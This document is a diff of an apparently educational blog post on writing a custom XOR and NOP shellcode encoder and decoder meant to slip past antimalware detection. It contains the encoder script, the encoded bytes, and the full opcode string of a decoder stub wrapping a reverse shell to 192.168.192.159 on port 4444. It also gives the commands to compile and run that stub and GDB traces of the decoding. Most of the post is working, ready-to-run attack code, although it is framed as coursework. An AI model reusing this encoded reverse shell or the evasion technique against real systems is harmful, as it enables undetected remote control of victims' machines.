@@ -8,11 +8,17 @@ toc: true
 ---                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                           
 ** PAGE STILL UNDER CONSTRUCTION **   
+## Introduction ##
+
+Sending well known shell code to target machine would most probably be detected by antimalware solution . 
+One way to bypass antimalware detection is to encode shell code and to have higher chances for sucessful bypass, custom encoder should be created and used. 
+In this blog post we will go thru process of creating simple encoder and decored. 
+As an example we will preform XOR operation on every shell code byte with 0x0F value (key) and add NOP instrunction after every encoded shell code byte. This endocer will double shell code size which can be tricky if buffer space is small but for educational purposes we can ignore that. 
+During decoding procedure, XOR operation will be preformed to restore original shell code and NOP instructions will be ignored.  
 
 ## Shell code ##
 
-First we will create python script which will XOR every byte with ```0x0f``` and add NOP (\x90) after each shellcode byte. 
-As shell code example - we can use reverse shell code form previous blog post which will establish connection to remote address 192.168.192.159 on port 4444. Wrapper skript will generate needed opcode:
+We can use reverse shell code and wrapper form previous ![blog post](https://smarinovic.github.io/posts/Reverse-shell/) which establishes connection to defined remote address at defined port (in our case IP address is 192.168.192.159 and port is 4444). 
 
 ```
 python wrapper.py 192.168.192.159 4444
@@ -21,7 +27,8 @@ python wrapper.py 192.168.192.159 4444
 
 ## Encoding shell code ##
 
-Once we get shell code, we will use following python script to encode it:
+Once we get shell code, we will use following python script to read thru defined bytearray (shell code opcodes) and preform XOR operation with 0x0F key. 
+NOP (\x90) will be injected after every encoded byte. 
 ```
 #!/usr/bin/python
 import sys
@@ -42,12 +49,16 @@ for x in bytearray(shellcode):   # for every byte in bytearray
 # Print encoded opcode
 print 'Encoded shellcode: ' + enc_shellcode
 ```
-
+Encoded shell code is following:
+```
+python encoder.py 
+Encoded shellcode: 0x3e,0x90,0xcf,0x90,0x3e,0x90,0xd4,0x90,0x3e,0x90,0xc6,0x90,0x3e,0x90,0xdd,0x90,0x3e,0x90,0xf9,0x90,0x69,0x90,0xb7,0x90,0x68,0x90,0x0e,0x90,0xbc,0x90,0x0d,0x90,0xbe,0x90,0x0e,0x90,0xbd,0x90,0x09,0x90,0xc2,0x90,0x8f,0x90,0x86,0x90,0xc8,0x90,0x3e,0x90,0xcf,0x90,0x69,0x90,0xb7,0x90,0x65,0x90,0x0e,0x90,0x3e,0x90,0xc6,0x90,0x5e,0x90,0x67,0x90,0xcf,0x90,0xa7,0x90,0xcf,0x90,0x90,0x90,0x69,0x90,0x67,0x90,0x1e,0x90,0x53,0x90,0x69,0x90,0x65,0x90,0x0d,0x90,0x86,0x90,0xf4,0x90,0x86,0x90,0xee,0x90,0xbd,0x90,0x19,0x90,0xc2,0x90,0x8f,0x90,0x3e,0x90,0xcf,0x90,0x3e,0x90,0xd4,0x90,0x3e,0x90,0xc6,0x90,0xbe,0x90,0x0c,0x90,0x3e,0x90,0xcf,0x90,0xbf,0x90,0x30,0x90,0x86,0x90,0xf4,0x90,0xf1,0x90,0xc6,0x90,0xc2,0x90,0x8f,0x90,0x7a,0x90,0xfb,0x90,0x3e,0x90,0xcf,0x90,0x5f,0x90,0x67,0x90,0x61,0x90,0x20,0x90,0x7c,0x90,0x67,0x90,0x67,0x90,0x20,0x90,0x20,0x90,0x6d,0x90,0x66,0x90,0x86,0x90,0xec,0x90,0x5f,0x90,0x86,0x90,0xed,0x90,0x5c,0x90,0x86,0x90,0xee,0x90,0xbf,0x90,0x04,0x90,0xc2,0x90,0x8f,0x90,
+```
 
 ## Decoder ##
 
 To sucessfuly decode encoded shell code, we need to preform XOR operation for every shell code byte with defined key 0x0F. 
-Every other buty we will skipp as it is NOP instrunction. We will use: 
+Every other byte will be skipped as it is NOP instrunction. We will use: 
 * EAX for XOR operations
 * ECX as counter for decoding stub
 * EDX as pointer to beggining of encoded (and later decoded) shell code
@@ -94,13 +105,13 @@ _start:
 
 ```
 
-Assembly code we need to compile and link it the usual way.. 
+Assembly code needs to be compiled and linked in the usual way.. 
 ```
 nasm -f elf32 -o decoder.o decoder.nasm
 ld -z execstack -o decoder decoder.o
 ```
 
-But to get opcode we need to modify objdump/cut command as output has more that 6 columns so instead of ```cut -f1-6``` we need to use ```cut -f1-7``` as follows:
+But to get opcode we need to modify the usual objdump/cut command as output has more that 6 columns, so instead of ```cut -f1-6``` we need to use ```cut -f1-7``` as follows:
 
 ```
 objdump -d $1 |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
@@ -111,7 +122,14 @@ With modified command, extracted opcode is following:
 "\xeb\x20\x5e\x31\xc0\x31\xc9\x31\xff\xb1\xc4\xd0\xf9\x89\xf2\x89\xf7\x8a\x06\x34\x0f\x88\x07\x46\x46\x47\x49\x80\xf9\x01\x75\xf1\xff\xe2\xe8\xdb\xff\xff\xff\x3e\x90\xcf\x90\x3e\x90\xd4\x90\x3e\x90\xc6\x90\x3e\x90\xdd\x90\x3e\x90\xf9\x90\x69\x90\xb7\x90\x68\x90\x0e\x90\xbc\x90\x0d\x90\xbe\x90\x0e\x90\xbd\x90\x09\x90\xc2\x90\x8f\x90\x86\x90\xc8\x90\x3e\x90\xcf\x90\x69\x90\xb7\x90\x65\x90\x0e\x90\x3e\x90\xc6\x90\x5e\x90\x67\x90\xcf\x90\xa7\x90\xcf\x90\x90\x90\x69\x90\x67\x90\x1e\x90\x53\x90\x69\x90\x65\x90\x0d\x90\x86\x90\xf4\x90\x86\x90\xee\x90\xbd\x90\x19\x90\xc2\x90\x8f\x90\x3e\x90\xcf\x90\x3e\x90\xd4\x90\x3e\x90\xc6\x90\xbe\x90\x0c\x90\x3e\x90\xcf\x90\xbf\x90\x30\x90\x86\x90\xf4\x90\xf1\x90\xc6\x90\xc2\x90\x8f\x90\x7a\x90\xfb\x90\x3e\x90\xcf\x90\x5f\x90\x67\x90\x61\x90\x20\x90\x7c\x90\x67\x90\x67\x90\x20\x90\x20\x90\x6d\x90\x66\x90\x86\x90\xec\x90\x5f\x90\x86\x90\xed\x90\x5c\x90\x86\x90\xee\x90\xbf\x90\x04\x90\xc2\x90\x8f\x90"
 ```
 
-Extracted opcode we need to copy in C skeleton file:
+Next, we can use skeleton code to run and test sucessfull decoding. To compile it following command should be used:
+
+```
+gcc -fno-stack-protector -z execstack -m32 skeleton.c -o encoded_revshell -g
+```
+
+Skeleton file with encoded shell code:
+
 ```
 #include <stdio.h>
 
@@ -125,25 +143,27 @@ int main()
 }
 ```
 
-When we compile and run it, shell code is decoded in memory and reverse shell is established:
-
-```
-gcc -fno-stack-protector -z execstack -m32 skeleton.c -o encoded_revshell -g
-```
-
-By stepping thu program with GDB we can see shell code decoding. At the beggining of decoding stup we can see that ESI register is pointing to the beggining of encoded shellcode. ESI is pointing to address 0x404067. In order to see decoding in action we will monitor first 10 bytes at given address.
-* Initial data on the stack
+By stepping thu program with GDB we can observe shell code decoding. 
+At the beggining of decoding stub we can see that ESI register is pointing to the beggining of encoded shellcode (memory address: ```0x404067```). 
 
 ```
 gdb-peda$ info register esi
 esi            0x404067            0x404067
+```
 
+So in order to observe decoing, we will monitor first 10 bytes starting at ```0x404067``` memory address.
+At beggining address contain encoded shell code (0x3e, 0x90, 0xcf, 0x90, 0x3e, 0x90 ...)
+
+* Initial data on address ```0x404067```
+
+```
 gdb-peda$ x/10b 0x404067
 0x404067 <shellcode+39>:        0x3e    0x90    0xcf    0x90    0x3e    0x90    0xd4    0x90
 0x40406f <shellcode+47>:        0x3e    0x90
 ```
 
-* stack staus after few itterations:
+* content of the same address after few itterations:
+We can see that 0x3e is decoded to 0x31 (XOR 0x0F, 0x3e = 0x31) and 0x90 is ignored and overwritten.
 
 ```
 gdb-peda$ x/10b 0x404067
@@ -151,11 +171,12 @@ gdb-peda$ x/10b 0x404067
 0x40406f <shellcode+47>:        0x3e    0x90
 ```
 
-* and after some more itterations we can see that decoded shell code doesn't not contain added NOPs and that all opcodes are XORed (3x XOR 0f = 31, cf XOR 0f = c0, etc.) and it has overwritten original opcodes:
+* content of the same address after some more itterations:
+We can see that decoded shell code doesn't not contain added NOPs and that all opcodes are XORed (0x3e XOR 0f = 0x31, 0xcf XOR 0x0f = 0xc0, etc.) and it has overwritten original encoded opcodes:
 ```
 gdb-peda$ x/10b 0x404067
 0x404067 <shellcode+39>:        0x31    0xc0    0x31    0xdb    0x31    0xc9    0x31    0xd2
 0x40406f <shellcode+47>:        0x31    0xf6
 ```
 
-![slika](...)
+![Custom decoder working](https://smarinovic.github.io/assets/img/slae_00017.png)
